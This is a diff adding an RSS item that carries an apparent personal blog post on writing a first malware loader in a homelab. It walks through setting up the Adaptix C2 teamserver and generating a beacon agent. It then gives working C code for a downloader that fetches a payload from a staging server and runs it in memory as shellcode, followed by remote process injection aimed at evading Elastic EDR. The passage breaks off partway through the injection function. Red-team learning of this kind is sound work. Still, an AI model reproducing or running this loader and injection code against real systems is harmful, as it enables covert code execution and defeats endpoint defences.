@@ -6,7 +6,572 @@
     <generator>Hugo -- gohugo.io</generator>
     <language>en-us</language>
     <copyright>Just adhere to [CC BY-NC 4.0](https://creativecommons.org/licenses/by-nc/4.0/)</copyright>
-    <lastBuildDate>Mon, 16 Mar 2026 02:33:55 -0400</lastBuildDate><atom:link href="https://ashtrace.github.io/posts/index.xml" rel="self" type="application/rss+xml" /><icon>https://ashtrace.github.io/logo.svg</icon>
+    <lastBuildDate>Sat, 21 Mar 2026 01:26:34 -0400</lastBuildDate><atom:link href="https://ashtrace.github.io/posts/index.xml" rel="self" type="application/rss+xml" /><icon>https://ashtrace.github.io/logo.svg</icon>
+    
+    
+    <item>
+      <title>Crafting a Loader: My First Experience Malware Development</title>
+      <link>https://ashtrace.github.io/posts/my_first_loader/</link>
+      <pubDate>Sat, 21 Mar 2026 01:26:34 -0400</pubDate>
+      
+      <guid>https://ashtrace.github.io/posts/my_first_loader/</guid>
+      <description><![CDATA[<p>So after spending what felt like a reasonable amount of time on the defensive side of things as setting up homelabs, staring at Kibana dashboards, and learning what alerts look like, I figured it was time to see what those alerts are actually for. The logical next step was to write the thing that triggers them. Armed with my SOC homelab, a copy of Adaptix C2, a dangerously short reading list on Windows internals, and the kind of confidence that only comes from not fully understanding what you&rsquo;re getting into, I set out to build a loader from scratch.</p>
+<h2 id="introduction-to-adaptixc2">Introduction to AdaptixC2</h2>
+<p>The general consensus is that Adapatix C2 provides a similar experience to Cobalt Strike. In CRTO I learned the red team methodologies through Cobalt Strike thus here I&rsquo;d use Adaptix for C2 server, listener and agent.</p>
+<h3 id="initial-setup">Initial Setup</h3>
+<p>The sections under the <a href="https://adaptix-framework.gitbook.io/adaptix-framework/adaptix-c2/getting-starting"><em>Getting Starting</em></a> module of <a href="https://adaptix-framework.gitbook.io/adaptix-framework"><em>Adaptix&rsquo;s documentation</em></a> provide with guide to build server and client images from source. A gist of commands to follow is:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>git clone https://github.com/Adaptix-Framework/AdaptixC2.git
+</span></span><span style="display:flex;"><span>cd AdaptixC2
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>sudo ./pre_install_linux_all.sh all
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>make server-ext
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>make client-fast
+</span></span></code></pre></div><p>Next, one would need to generate SSL certificates for the teamserver. The command to aid is</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>openssl req -x509 -nodes -newkey rsa:2048 -keyout server.rsa.key -out server.rsa.crt -days <span style="color:#ae81ff">3650</span>
+</span></span></code></pre></div><p><img src="./adaptix-c2-openssl-cert-generation.png" alt="adaptix-c2-openssl-cert-generation"></p>
+<p>The server and key names are to be fed into a YAML file which provides with configuration for the teamserver. The example configuration in the documentation is as follows:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-yml" data-lang="yml"><span style="display:flex;"><span><span style="color:#f92672">Teamserver</span>:
+</span></span><span style="display:flex;"><span>  <span style="color:#f92672">interface</span>: <span style="color:#e6db74">&#34;0.0.0.0&#34;</span>
+</span></span><span style="display:flex;"><span>  <span style="color:#f92672">port</span>: <span style="color:#ae81ff">4321</span>
+</span></span><span style="display:flex;"><span>  <span style="color:#f92672">endpoint</span>: <span style="color:#e6db74">&#34;/endpoint&#34;</span>
+</span></span><span style="display:flex;"><span>  <span style="color:#f92672">password</span>: <span style="color:#e6db74">&#34;pass&#34;</span>
+</span></span><span style="display:flex;"><span>  <span style="color:#f92672">only_password</span>: <span style="color:#66d9ef">true</span>
+</span></span><span style="display:flex;"><span>  <span style="color:#f92672">operators</span>:
+</span></span><span style="display:flex;"><span>    <span style="color:#f92672">operator1</span>: <span style="color:#e6db74">&#34;pass1&#34;</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#f92672">operator2</span>: <span style="color:#e6db74">&#34;pass2&#34;</span>
+</span></span><span style="display:flex;"><span>  <span style="color:#f92672">cert</span>: <span style="color:#e6db74">&#34;server.rsa.crt&#34;</span>
+</span></span><span style="display:flex;"><span>  <span style="color:#f92672">key</span>: <span style="color:#e6db74">&#34;server.rsa.key&#34;</span>
+</span></span><span style="display:flex;"><span>  <span style="color:#f92672">extenders</span>:
+</span></span><span style="display:flex;"><span>    - <span style="color:#e6db74">&#34;extenders/beacon_listener_http/config.yaml&#34;</span>
+</span></span><span style="display:flex;"><span>    - <span style="color:#e6db74">&#34;extenders/beacon_listener_smb/config.yaml&#34;</span>
+</span></span><span style="display:flex;"><span>    - <span style="color:#e6db74">&#34;extenders/beacon_listener_tcp/config.yaml&#34;</span>
+</span></span><span style="display:flex;"><span>    - <span style="color:#e6db74">&#34;extenders/beacon_listener_dns/config.yaml&#34;</span>
+</span></span><span style="display:flex;"><span>    - <span style="color:#e6db74">&#34;extenders/beacon_agent/config.yaml&#34;</span>
+</span></span><span style="display:flex;"><span>    - <span style="color:#e6db74">&#34;extenders/gopher_listener_tcp/config.yaml&#34;</span>
+</span></span><span style="display:flex;"><span>    - <span style="color:#e6db74">&#34;extenders/gopher_agent/config.yaml&#34;</span>
+</span></span><span style="display:flex;"><span>  <span style="color:#f92672">axscripts</span>:
+</span></span><span style="display:flex;"><span><span style="color:#75715e">#    - &#34;Extension-Kit/extension-kit.axs&#34;</span>
+</span></span><span style="display:flex;"><span>  <span style="color:#f92672">access_token_live_hours</span>: <span style="color:#ae81ff">12</span>
+</span></span><span style="display:flex;"><span>  <span style="color:#f92672">refresh_token_live_hours</span>: <span style="color:#ae81ff">168</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">HttpServer</span>:
+</span></span><span style="display:flex;"><span>  <span style="color:#f92672">error</span>:
+</span></span><span style="display:flex;"><span>    <span style="color:#f92672">status</span>: <span style="color:#ae81ff">404</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#f92672">headers</span>:
+</span></span><span style="display:flex;"><span>      <span style="color:#f92672">Content-Type</span>: <span style="color:#e6db74">&#34;text/html; charset=UTF-8&#34;</span>
+</span></span><span style="display:flex;"><span>      <span style="color:#f92672">Server</span>: <span style="color:#e6db74">&#34;AdaptixC2&#34;</span>
+</span></span><span style="display:flex;"><span>      <span style="color:#f92672">Adaptix-Version</span>: <span style="color:#e6db74">&#34;v1.2&#34;</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#f92672">page</span>: <span style="color:#e6db74">&#34;404page.html&#34;</span>
+</span></span><span style="display:flex;"><span>  <span style="color:#f92672">http</span>:
+</span></span><span style="display:flex;"><span>    <span style="color:#f92672">max_header_bytes</span>: <span style="color:#ae81ff">8192</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#f92672">read_header_timeout_sec</span>: <span style="color:#ae81ff">0</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#f92672">read_timeout_sec</span>: <span style="color:#ae81ff">0</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#f92672">write_timeout_sec</span>: <span style="color:#ae81ff">0</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#f92672">idle_timeout_sec</span>: <span style="color:#ae81ff">0</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#f92672">request_timeout_sec</span>: <span style="color:#ae81ff">300</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#f92672">request_timeout_message</span>: <span style="color:#e6db74">&#34;504 Gateway Timeout&#34;</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#f92672">disable_keep_alives</span>: <span style="color:#66d9ef">false</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#f92672">enable_http2</span>: <span style="color:#66d9ef">true</span>
+</span></span><span style="display:flex;"><span>  <span style="color:#f92672">tls</span>:
+</span></span><span style="display:flex;"><span>    <span style="color:#f92672">min_version</span>: <span style="color:#e6db74">&#34;TLS1.2&#34;</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#f92672">max_version</span>: <span style="color:#e6db74">&#34;TLS1.3&#34;</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#f92672">prefer_server_cipher_suites</span>: <span style="color:#66d9ef">false</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#f92672">cipher_suites</span>:
+</span></span><span style="display:flex;"><span>      - <span style="color:#e6db74">&#34;TLS_ECDHE_RSA_WITH_AES_128_GCM_SHA256&#34;</span>
+</span></span><span style="display:flex;"><span>      - <span style="color:#e6db74">&#34;TLS_ECDHE_RSA_WITH_AES_256_GCM_SHA384&#34;</span>
+</span></span><span style="display:flex;"><span>      - <span style="color:#e6db74">&#34;TLS_ECDHE_ECDSA_WITH_AES_128_GCM_SHA256&#34;</span>
+</span></span><span style="display:flex;"><span>      - <span style="color:#e6db74">&#34;TLS_ECDHE_ECDSA_WITH_AES_256_GCM_SHA384&#34;</span>
+</span></span><span style="display:flex;"><span>      - <span style="color:#e6db74">&#34;TLS_RSA_WITH_AES_128_GCM_SHA256&#34;</span>
+</span></span><span style="display:flex;"><span>      - <span style="color:#e6db74">&#34;TLS_RSA_WITH_AES_256_GCM_SHA384&#34;</span>
+</span></span></code></pre></div><p>To read more about the parameters <a href="https://adaptix-framework.gitbook.io/adaptix-framework/adaptix-c2/getting-starting/starting"><em>click here</em></a>.</p>
+<p>Finally, start the server using the following command:</p>
+<pre tabindex="0"><code>./adaptixserver -profile profile.yaml
+</code></pre><p><img src="./adaptix-c2-adaptixserver-launch.png" alt="adaptix-c2-adaptixserver-launch"></p>
+<p>And connect through the client.</p>
+<p><img src="./adaptix-c2-adaptixclient-login.png" alt="adaptix-c2-adaptixclient-login"></p>
+<p><img src="./adaptix-c2-adaptixclient-dashboard.png" alt="adaptix-c2-adaptixclient-dashboard"></p>
+<h3 id="listeners-and-agents">Listeners and Agents</h3>
+<p>To create a listener one&rsquo;d need to click on the <em>headphones</em> icon. In the <code>listener</code> tray that appears in bottom-half of the dashboard, right-click and choose the <code>create</code> option. Configure the listener properties as required in the dialog window.</p>
+<p><img src="./adaptix-c2-create-listener.png" alt="adaptix-c2-create-listener"></p>
+<p>Finally, to create an agent for the listener, right-click on the listener and select <code>Generate agent</code>. Configure the options and save the agent to the disk.</p>
+<p><img src="./adaptix-c2-create-beacon-agent-exe.png" alt="adaptix-c2-create-beacon-agent-exe"></p>
+<h3 id="execution">Execution</h3>
+<p>I executed the beacon agent EXE file on a Windows 11 system with only default Windows Security controls for consumer workstations and no enterprise or similar solutions. It wasn&rsquo;t detected by the running defender process and I recieved a callback.</p>
+<p><img src="./adaptix-c2-execute-agent-exe.png" alt="adaptix-c2-execute-agent-exe"></p>
+<p><img src="./adaptix-c2-connected-beacon.png" alt="adaptix-c2-connected-beacon"></p>
+<p>But it was flagged by vendors as AdaptixC2 assocaited malware when I uploaded it to VirusTotal.</p>
+<p><img src="./adaptix-c2-agent-exe-virustotal.png" alt="adaptix-c2-agent-exe-virustotal"></p>
+<p>As evident from the image above, Elasic successfully detected the agent. To validate this, I transferred the agent to the SOC-homelab Windows 11 endpoint VM I had created in previous blog-post.</p>
+<p><img src="./adaptix-c2-agent-detected-by-elastic-agent.png" alt="adaptix-c2-agent-detected-by-elastic-agent"></p>
+<p><img src="./adaptix-c2-agent-detected-by-elastic-agent-alert.png" alt="adaptix-c2-agent-detected-by-elastic-agent-alert"></p>
+<p>In the following sections, I&rsquo;ll try to create a custom loader that bypasses Elastic&rsquo;s detection and allows me to run the beacon agent.</p>
+<h3 id="further-reading-for-adaptix-c2">Further Reading for Adaptix C2</h3>
+<p>I&rsquo;d recommend going through the following sections to establish accquaintance with Adaptix</p>
+<ul>
+<li><a href="https://adaptix-framework.gitbook.io/adaptix-framework/adaptix-c2/getting-starting">Getting Starting</a></li>
+<li><a href="https://adaptix-framework.gitbook.io/adaptix-framework/adaptix-c2/user-interface">User Interface</a></li>
+<li><a href="https://adaptix-framework.gitbook.io/adaptix-framework/adaptix-c2/listeners-and-agents">Listeners and Agents</a></li>
+</ul>
+<h2 id="the-skeleton-of-a-loader">The Skeleton of a Loader</h2>
+<p>My aim was to create a simple loader that fetches the payload from a staging web server and executes. To build this, the two components to be developed were:</p>
+<ol>
+<li><strong>Downloader</strong> - Section of code that fetches the payload from the remote staging server over HTTP. (Yes HTTP, I know, but this is just some exercise not an operation so I guess this would do).</li>
+<li><strong>Executor</strong> - Section of code that executes the payload retrieved.</li>
+</ol>
+<h3 id="downloader">Downloader</h3>
+<p>I used the Wininet library to create the downloader named as the function <code>FetchBlob</code> in the following code. The general structure of the code-block is</p>
+<ul>
+<li>Take the staging server&rsquo;s URL in <code>lpszUrl</code>.</li>
+<li>Fetch the data in chunks of <code>4096</code> bytes (I should&rsquo;ve created a macro for that atleast, but here we are) and save it in a temporary chunk. Consolidate the chunk to the larger buffer.</li>
+<li>Return the address of the buffer and its size in <code>ppBlob</code> and <code>psBlobSize</code> respectively.</li>
+</ul>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#75715e">// Retrieves payload from the staging web server
+</span></span></span><span style="display:flex;"><span>BOOL <span style="color:#a6e22e">FetchBlob</span>(
+</span></span><span style="display:flex;"><span>	IN		LPCWSTR	lpszUrl,
+</span></span><span style="display:flex;"><span>	OUT		PBYTE<span style="color:#f92672">*</span>	ppBlob,
+</span></span><span style="display:flex;"><span>	OUT		PSIZE_T	psBlobSize
+</span></span><span style="display:flex;"><span>) {
+</span></span><span style="display:flex;"><span>	BOOL bSTATE <span style="color:#f92672">=</span> TRUE;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>	HINTERNET	hInternet		<span style="color:#f92672">=</span> NULL;
+</span></span><span style="display:flex;"><span>	HINTERNET	hInternetFile	<span style="color:#f92672">=</span> NULL;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>	PBYTE		pBuffer			<span style="color:#f92672">=</span> NULL;
+</span></span><span style="display:flex;"><span>	SIZE_T		sBufferSize		<span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>	DWORD		dwBytesRead <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>	BYTE		pTmpBuffer[<span style="color:#ae81ff">4096</span>];
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>	hInternet <span style="color:#f92672">=</span> <span style="color:#a6e22e">InternetOpenW</span>(NULL, NULL, NULL, NULL, NULL);
+</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">if</span> (hInternet <span style="color:#f92672">==</span> NULL) {
+</span></span><span style="display:flex;"><span>		<span style="color:#a6e22e">DEBUG_PRINT</span>(<span style="color:#e6db74">&#34;InternetOpenW failed with error: %lu</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>, <span style="color:#a6e22e">GetLastError</span>());
+</span></span><span style="display:flex;"><span>		bSTATE <span style="color:#f92672">=</span> FALSE;
+</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">goto</span> _CleanUp;
+</span></span><span style="display:flex;"><span>	}
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>	hInternetFile <span style="color:#f92672">=</span> <span style="color:#a6e22e">InternetOpenUrlW</span>(hInternet, lpszUrl, NULL, NULL, INTERNET_FLAG_HYPERLINK, NULL);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">if</span> (hInternetFile <span style="color:#f92672">==</span> NULL) {
+</span></span><span style="display:flex;"><span>		<span style="color:#a6e22e">DEBUG_PRINT</span>(<span style="color:#e6db74">&#34;InternetOpenUrlW failed with error: %lu</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>, <span style="color:#a6e22e">GetLastError</span>());
+</span></span><span style="display:flex;"><span>		bSTATE <span style="color:#f92672">=</span> FALSE;
+</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">goto</span> _CleanUp;
+</span></span><span style="display:flex;"><span>	}
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">while</span> (TRUE) {
+</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">if</span> (<span style="color:#f92672">!</span><span style="color:#a6e22e">InternetReadFile</span>(hInternetFile, pTmpBuffer, <span style="color:#66d9ef">sizeof</span>(pTmpBuffer), <span style="color:#f92672">&amp;</span>dwBytesRead)) {
+</span></span><span style="display:flex;"><span>			<span style="color:#a6e22e">DEBUG_PRINT</span>(<span style="color:#e6db74">&#34;InternetReadFile failed with error: %lu</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>, <span style="color:#a6e22e">GetLastError</span>());
+</span></span><span style="display:flex;"><span>			bSTATE <span style="color:#f92672">=</span> FALSE;
+</span></span><span style="display:flex;"><span>			<span style="color:#66d9ef">goto</span> _CleanUp;
+</span></span><span style="display:flex;"><span>		}
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">if</span> (<span style="color:#f92672">!</span>(dwBytesRead <span style="color:#f92672">&gt;</span> <span style="color:#ae81ff">0</span>)) {
+</span></span><span style="display:flex;"><span>			<span style="color:#66d9ef">break</span>;
+</span></span><span style="display:flex;"><span>		}
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">if</span> (pBuffer <span style="color:#f92672">==</span> NULL)
+</span></span><span style="display:flex;"><span>			pBuffer <span style="color:#f92672">=</span> (PBYTE)<span style="color:#a6e22e">HeapAlloc</span>(<span style="color:#a6e22e">GetProcessHeap</span>(), HEAP_ZERO_MEMORY, dwBytesRead);
+</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">else</span>
+</span></span><span style="display:flex;"><span>			pBuffer <span style="color:#f92672">=</span> (PBYTE)<span style="color:#a6e22e">HeapReAlloc</span>(<span style="color:#a6e22e">GetProcessHeap</span>(), HEAP_ZERO_MEMORY, pBuffer, sBufferSize <span style="color:#f92672">+</span> dwBytesRead);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">if</span> (pBuffer <span style="color:#f92672">==</span> NULL) {
+</span></span><span style="display:flex;"><span>			<span style="color:#a6e22e">DEBUG_PRINT</span>(<span style="color:#e6db74">&#34;Failed to (re)allocate pBuffer. Last error: %lu</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>, <span style="color:#a6e22e">GetLastError</span>());
+</span></span><span style="display:flex;"><span>			bSTATE <span style="color:#f92672">=</span> FALSE;
+</span></span><span style="display:flex;"><span>			<span style="color:#66d9ef">goto</span> _CleanUp;
+</span></span><span style="display:flex;"><span>		}
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>		<span style="color:#a6e22e">memcpy</span>(pBuffer <span style="color:#f92672">+</span> sBufferSize, pTmpBuffer, dwBytesRead);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>		sBufferSize <span style="color:#f92672">+=</span> dwBytesRead;
+</span></span><span style="display:flex;"><span>	}
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>	<span style="color:#f92672">*</span>ppBlob		<span style="color:#f92672">=</span> pBuffer;
+</span></span><span style="display:flex;"><span>	<span style="color:#f92672">*</span>psBlobSize	<span style="color:#f92672">=</span> sBufferSize;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>_CleanUp:
+</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">if</span> (hInternetFile)
+</span></span><span style="display:flex;"><span>		<span style="color:#a6e22e">InternetCloseHandle</span>(hInternetFile);
+</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">if</span> (hInternet) {
+</span></span><span style="display:flex;"><span>		<span style="color:#a6e22e">InternetCloseHandle</span>(hInternet);
+</span></span><span style="display:flex;"><span>		<span style="color:#a6e22e">InternetSetOptionW</span>(NULL, INTERNET_OPTION_SETTINGS_CHANGED, NULL, <span style="color:#ae81ff">0</span>);
+</span></span><span style="display:flex;"><span>	}
+</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">RtlSecureZeroMemory</span>(pTmpBuffer, <span style="color:#ae81ff">4096</span>);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">return</span> bSTATE;
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><p>The <code>DEBUG_PRINT</code> macro helps me to strip the debug <code>printf</code> statements at compile time when I want to. It is defined as follows, when <code>LOG_DEBUG_MSG</code> is defined the <code>DEBUG_PRINT</code> statements are essentially <code>printf</code> calls specifying file and line number along with the message passed. When <code>LOG_DEBUG_MSG</code> is not defined, <code>DEBUG_PRINT</code> turns to be just a <code>void</code> statement.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#75715e">#define LOG_DEBUG_MSG
+</span></span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">#ifdef LOG_DEBUG_MSG
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#define DEBUG_PRINT(fmt, ...) \
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">	printf(&#34;[DEBUG] (%s:%d) &#34; fmt &#34;\n&#34;, __FILE__, __LINE__,  ##__VA_ARGS__)
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#else
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#define	DEBUG_PRINT(fmt, ...) ((void)0)
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#endif </span><span style="color:#75715e">// !LOG_DEBUG_MSG
+</span></span></span></code></pre></div><h3 id="the-executor">The Executor</h3>
+<p>The age old <code>VirtualAlloc</code> -&gt; <code>VirtualProtect</code> -&gt; <code>CreateThread</code> is as simple as it is signatured. I used this flow to establish a <em>control sample</em> for future reference and it served as a basic executor to validate my downloader logic simultaneously. The parameters are the buffer address and size populated by previously mentined downloader logic.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#66d9ef">void</span> <span style="color:#a6e22e">Run</span>(
+</span></span><span style="display:flex;"><span>	IN	PBYTE	pBlob,
+</span></span><span style="display:flex;"><span>	IN	SIZE_T	sBlobSize
+</span></span><span style="display:flex;"><span>) {
+</span></span><span style="display:flex;"><span>	BOOL	bSTATE			<span style="color:#f92672">=</span> TRUE;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>	PBYTE	pExecBlob <span style="color:#f92672">=</span> NULL;
+</span></span><span style="display:flex;"><span>	DWORD	dwOldProtection	<span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>	HANDLE	hThread <span style="color:#f92672">=</span> NULL;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>	pExecBlob <span style="color:#f92672">=</span> <span style="color:#a6e22e">VirtualAlloc</span>(NULL, sBlobSize, MEM_RESERVE <span style="color:#f92672">|</span> MEM_COMMIT, PAGE_READWRITE);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">if</span> (pExecBlob <span style="color:#f92672">==</span> NULL) {
+</span></span><span style="display:flex;"><span>		<span style="color:#a6e22e">DEBUG_PRINT</span>(<span style="color:#e6db74">&#34;VirtualAlloc failed with error: %lu</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>, <span style="color:#a6e22e">GetLastError</span>());
+</span></span><span style="display:flex;"><span>	}
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">memcpy</span>(pExecBlob, pBlob, sBlobSize);
+</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">RtlSecureZeroMemory</span>(pBlob, sBlobSize);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">if</span> (<span style="color:#f92672">!</span><span style="color:#a6e22e">VirtualProtect</span>(pExecBlob, sBlobSize, PAGE_EXECUTE_READ, <span style="color:#f92672">&amp;</span>dwOldProtection)) {
+</span></span><span style="display:flex;"><span>		<span style="color:#a6e22e">DEBUG_PRINT</span>(<span style="color:#e6db74">&#34;VirtualProtect failed with error: %lu</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>, <span style="color:#a6e22e">GetLastError</span>());
+</span></span><span style="display:flex;"><span>		bSTATE <span style="color:#f92672">=</span> FALSE;
+</span></span><span style="display:flex;"><span>	}
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>	hThread <span style="color:#f92672">=</span> <span style="color:#a6e22e">CreateThread</span>(NULL, NULL, pExecBlob, NULL, NULL, NULL);
+</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">if</span> (hThread <span style="color:#f92672">==</span> NULL) {
+</span></span><span style="display:flex;"><span>		<span style="color:#a6e22e">DEBUG_PRINT</span>(<span style="color:#e6db74">&#34;CreateThread failed with error: %lu</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>, <span style="color:#a6e22e">GetLastError</span>());
+</span></span><span style="display:flex;"><span>		bSTATE <span style="color:#f92672">=</span> FALSE;
+</span></span><span style="display:flex;"><span>	}
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">WaitForSingleObject</span>(hThread, INFINITE);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">return</span> bSTATE;
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><h3 id="an-attempt-at-execution">An attempt at execution</h3>
+<p>To validate the functionality I used <code>msfvenom</code> to create a  payload to spawn a calculator <code>calc.exe</code>.</p>
+<p>I created a dump function to display bytecodes fetched (<em>visible in terminal in the background</em>) from the remote staging server before executing it.</p>
+<p><img src="./NetUtil-execution.png" alt="NetUtil-execution"></p>
+<p>I labelled this loaders as <em>NetUtil.exe</em> and served through a python web server.</p>
+<p>This version of loader was detected as soon as it was downloaded on the endpoint device with Elastic&rsquo;s EDR agent (My <a href="https://ashtrace.github.io/posts/soc_homelab_101/">previous blog</a> post may help in configuring a SOC homelab with Elastic).</p>
+<p><img src="./NetUtil-exe-detected.png" alt="NetUtil-exe-detected"></p>
+<p>The corresponding alert on the Kibana dashboard was:</p>
+<p><img src="./NetUtil-exe-detected-alert.png" alt="NetUtil-exe-detected-alert"></p>
+<p>The Virustotal performance of this loader was more glorious than the Adaptix&rsquo;s C2 agent executable itself as it score 20 compared to 12 detections of Adaptix&rsquo;s binary.</p>
+<p><img src="./NetUtil-virustotal.png" alt="NetUtil-virustotal"></p>
+<h2 id="why-inject-in-yourself-when-you-can-inject-others">Why inject in yourself when you can inject others?</h2>
+<p>While I did not hope to achieve much from this but this seemed to me as the next logical step and thus in a simple subsitution of target processes I replaced the target of payload injection from loader to a secondary process. The code logic was same as the rudimentory <code>Run</code> function described above with slight subsitutions to operate in context of target process.</p>
+<table>
+  <thead>
+      <tr>
+          <th>Run</th>
+          <th>RunRemote</th>
+      </tr>
+  </thead>
+  <tbody>
+      <tr>
+          <td>VirtualAlloc</td>
+          <td>VirtualAllocEx</td>
+      </tr>
+      <tr>
+          <td>memcpy</td>
+          <td>WriteProcessMemory</td>
+      </tr>
+      <tr>
+          <td>VirtualProtect</td>
+          <td>VirtualProtectEx</td>
+      </tr>
+      <tr>
+          <td>CreateThread</td>
+          <td>CreateRemoteThread</td>
+      </tr>
+  </tbody>
+</table>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#66d9ef">void</span> <span style="color:#a6e22e">RunRemote</span>(
+</span></span><span style="display:flex;"><span>	IN	HANDLE	hProcess,
+</span></span><span style="display:flex;"><span>	IN	PBYTE	pBlob,
+</span></span><span style="display:flex;"><span>	IN	SIZE_T	sBlobSize
+</span></span><span style="display:flex;"><span>) {
+</span></span><span style="display:flex;"><span>	PVOID	pExecAddress			<span style="color:#f92672">=</span> NULL;
+</span></span><span style="display:flex;"><span>	
+</span></span><span style="display:flex;"><span>	SIZE_T	sNumberOfBytesWritten	<span style="color:#f92672">=</span> NULL;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>	DWORD	dwOldProtection			<span style="color:#f92672">=</span> NULL;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>	pExecAddress <span style="color:#f92672">=</span> <span style="color:#a6e22e">VirtualAllocEx</span>(hProcess, NULL, sBlobSize, MEM_RESERVE <span style="color:#f92672">|</span> MEM_COMMIT, PAGE_READWRITE);
+</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">if</span> (pExecAddress <span style="color:#f92672">==</span> NULL) {
